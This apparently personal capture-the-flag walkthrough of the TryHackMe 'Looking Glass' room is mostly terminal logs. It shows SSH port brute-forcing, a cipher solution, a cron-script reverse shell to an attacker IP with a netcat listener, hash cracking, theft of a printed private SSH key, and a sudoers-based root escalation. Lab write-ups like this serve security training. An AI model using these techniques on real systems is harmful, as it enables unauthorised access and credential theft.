```
Enumerating SSH

When connecting to one of the ports (in this case trying one of the higher ones), the SSH server responds with “Higher”:

                                                                                     
┌──(kali㉿kali)-[~]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa -p 13789 test@10.10.29.181
The authenticity of host '[10.10.29.181]:13789 ([10.10.29.181]:13789)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.29.181]:13789' (RSA) to the list of known hosts.
Higher
Connection to 10.10.29.181 closed.

┌──(kali㉿kali)-[~]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa -p 9000 test@10.10.29.181
The authenticity of host '[10.10.29.181]:9000 ([10.10.29.181]:9000)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:30: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.29.181]:9000' (RSA) to the list of known hosts.
Lower
Connection to 10.10.29.181 closed.

Using a quick Bash for loop to find out the exact port:
for i in $(seq 12000 13000); do echo "connecting to port $i"; ssh -o 'LogLevel=ERROR' -o 'StrictHostKeyChecking=no' -p $i test@10.10.49.207;done | grep -vE 'Lower|Higher'

┌──(kali㉿kali)-[~]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa -p 12992 test@10.10.29.181

The authenticity of host '[10.10.29.181]:12992 ([10.10.29.181]:12992)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:30: [hashed name]
    ~/.ssh/known_hosts:31: [hashed name]
    ~/.ssh/known_hosts:32: [hashed name]
    ~/.ssh/known_hosts:33: [hashed name]
    ~/.ssh/known_hosts:34: [hashed name]
    ~/.ssh/known_hosts:35: [hashed name]
    ~/.ssh/known_hosts:36: [hashed name]
    ~/.ssh/known_hosts:37: [hashed name]
    (24 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.29.181]:12992' (RSA) to the list of known hosts.
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:

***page***
https://www.boxentriq.com/code-breaking/cipher-identifier

https://www.boxentriq.com/code-breaking/vigenere-cipher

Max Key Length:20 (vigenere-cipher) / auto solve without a key -> thealphabetcipher

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is bewareTheJabberwock

ssh -> jabberwock:JumpedStoppedChatteringPlanted

┌──(kali㉿kali)-[~]
└─$ ssh jabberwock@10.10.29.181                                
The authenticity of host '10.10.29.181 (10.10.29.181)' can't be established.
ED25519 key fingerprint is SHA256:xs9LzYRViB8jiE4uU7UlpLdwXgzR3sCZpTYFU2RgvJ4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.29.181' (ED25519) to the list of known hosts.
jabberwock@10.10.29.181's password: 
Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1
jabberwock@looking-glass:~$ 
jabberwock@looking-glass:~$ pwd
/home/jabberwock
jabberwock@looking-glass:~$ ls
poem.txt  twasBrillig.sh  user.txt
jabberwock@looking-glass:~$ cat user.txt
}32a911966cab2d643f5d57d9e0173d56{mht
reversing with ciberchef.io -> thm{65d3710e9d75d5f346d2bac669119a23} or 
cat user.txt | rev
thm{65d3710e9d75d5f346d2bac669119a23}

Privilege Escalation

Transferring the LinPEAS enumeration script with the Python Simple HTTP Server and Wget:

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
Sudoers file: /etc/sudoers.d/alice is readable
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash

@reboot tweedledum bash /home/jabberwock/twasBrillig.sh

It also looks like the jabberwock user can execute reboot as root:

The twasBrillig.sh script is modifiable by the current user, changing it to execute a reverse shell:

bash -i >& /dev/tcp/10.18.1.77/443 0>&1

The next step is to set up a Netcat listener, which will catch the reverse shell when it is executed by the victim host, using the following flags:

    -l to listen for incoming connections
    -v for verbose output
    -n to skip the DNS lookup
    -p to specify the port to listen on
 sudo nc -nlvp 443
 When executing /sbin/reboot to restart the system, a callback on the Netcat listener is received, granting a shell as the tweedledum user:
 
 jabberwock@looking-glass:~$ sudo /sbin/reboot
Connection to 10.10.29.181 closed by remote host.
Connection to 10.10.29.181 closed.

┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nc -lvnp 443         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.18.1.77] from (UNKNOWN) [10.10.29.181] 45944
bash: cannot set terminal process group (917): Inappropriate ioctl for device
bash: no job control in this shell
tweedledum@looking-glass:~$ 
tweedledum@looking-glass:~$ cat poem.txt
cat poem.txt
     'Tweedledum and Tweedledee
      Agreed to have a battle;
     For Tweedledum said Tweedledee
      Had spoiled his nice new rattle.

     Just then flew down a monstrous crow,
      As black as a tar-barrel;
     Which frightened both the heroes so,
      They quite forgot their quarrel.'
tweedledum@looking-glass:~$ cat humptydumpty.txt
cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b

some hashes (passwords) (https://hashes.com/en/decrypt/hash) or crackstation.net

dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9	sha256	maybe
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed	sha256	one
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624	sha256	of
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f	sha256	these
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6	sha256	is
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0	sha256	the
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8	sha256	password
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b	Unknown	Not found.

so the last is the pass

We detect some as SHA256PLAIN hashes, and they decode to reveal a sentence. The last one is not a SHA256 hash, but instead it is hex encoded. Lucky for us the website auto detected it and decoded that one along with the others.

the password is zyxwvutsrqponmlk

tweedledum@looking-glass:/home$ su humptydumpty 
su humptydumpty
su: must be run from a terminal
tweedledum@looking-glass:/home$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ome$ python3 -c 'import pty;pty.spawn("/bin/bash")'
tweedledum@looking-glass:/home$ su humptydumpty
su humptydumpty

Password: zyxwvutsrqponmlk

humptydumpty@looking-glass:/home$

This user’s home directory does not seem to contain anything useful:
Although the alice user’s folder does not allow to list files, the .ssh folder can still be accessed, it appears to contain a private SSH key:

humptydumpty@looking-glass:/home$ ls -la
ls -la
total 32
drwxr-xr-x  8 root         root         4096 Jul  3  2020 .
drwxr-xr-x 24 root         root         4096 Jul  2  2020 ..
drwx--x--x  6 alice        alice        4096 Jul  3  2020 alice
drwx------  3 humptydumpty humptydumpty 4096 Jul 31 17:10 humptydumpty
drwxrwxrwx  6 jabberwock   jabberwock   4096 Jul 31 16:57 jabberwock
drwx------  5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
drwx------  3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
drwx------  2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum
humptydumpty@looking-glass:/home$ cd alice
cd alice
humptydumpty@looking-glass:/home/alice$ ls -la
ls -la
ls: cannot open directory '.': Permission denied
humptydumpty@looking-glass:/home/alice$ cat .ssh/id_rsa
cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
humptydumpty@looking-glass:/home/alice$
Copying its contents to a local file:
Assigning to it the appropriate permissions and using it to authenticate as the alice user:

┌──(kali㉿kali)-[~/Downloads]
└─$ chmod 600 alice_key
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -i alice_key alice@10.10.29.181 
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ 
executing linpeas.sh
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid     
Sudoers file: /etc/sudoers.d/alice is readable                                       
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
he following is the syntax used by the Sudoers files, which means alice can run /bin/bash as root, but only on the “ssalg-gnikool” host. 
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# 

root@looking-glass:/root# ls
passwords  passwords.sh  root.txt  the_end.txt
root@looking-glass:/root# cat the_end.txt 
She took her off the table as she spoke, and shook her backwards and forwards with all her might.

The Red Queen made no resistance whatever; only her face grew very small, and her eyes got large and green: and still, as Alice went on shaking her, she kept on growing shorter—and fatter—and softer—and rounder—and—

—and it really was a kitten, after all.
root@looking-glass:/root# cd passwords/
root@looking-glass:/root/passwords# ls
passGenerator.py  wordlist.txt
root@looking-glass:/root/passwords# cat passGenerator.py 
import random
wordlist = open("/root/passwords/wordlist.txt","r")
words = wordlist.read().splitlines()
wordlist.close()

def genPass(wordCount: int):
    password = ""
    for i in range(wordCount):
        password += random.choice(words)
    return password

print(genPass(4))
root@looking-glass:/root/passwords# cd ..
root@looking-glass:/root# ls
passwords  passwords.sh  root.txt  the_end.txt
root@looking-glass:/root# cat root.txt 
}f3dae6dec817ad10b750d79f6b7332cb{mht
root@looking-glass:/root# cat root.txt | rev
thm{bc2337b6f97d057b01da718ced6ead3f}
root@looking-glass:/root# 

```

[[LinuxFunctionHooking]]